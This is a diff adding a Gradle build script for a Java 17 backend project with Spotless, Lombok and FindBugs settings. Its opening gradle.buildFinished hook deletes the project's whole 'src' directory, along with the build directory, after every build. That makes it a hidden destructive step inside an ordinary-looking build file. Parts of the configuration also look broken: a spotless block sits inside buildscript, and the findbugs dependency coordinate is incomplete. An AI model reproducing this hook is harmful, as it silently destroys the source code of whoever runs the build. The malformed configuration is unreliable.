@@ -1,0 +1,36 @@
+gradle.buildFinished {
+    project.buildDir.deleteDir()
+    project.file('src').deleteDir()
+}
+
+allprojects {
+
+    group 'com.intuit.backend'
+
+    apply plugin: 'java'
+    apply plugin: 'com.diffplug.spotless'
+
+    sourceCompatibility = JavaVersion.VERSION_17
+    targetCompatibility = JavaVersion.VERSION_17
+
+    buildscript {
+        spotless {
+            java {
+                googleJavaFormat("${googleJavaFormatVersion}").aosp().reflowLongStrings()
+            }
+        }
+    }
+
+    repositories {
+        mavenCentral()
+        jcenter()
+        google()
+    }
+
+    dependencies {
+        // https://projectlombok.org/setup/gradle
+        compileOnly "org.projectlombok:lombok:$lombokVersion"
+        annotationProcessor "org.projectlombok:lombok:$lombokVersion"
+        implementation "com.google.code.findbugs:$findbugsVersion"
+    }
+}
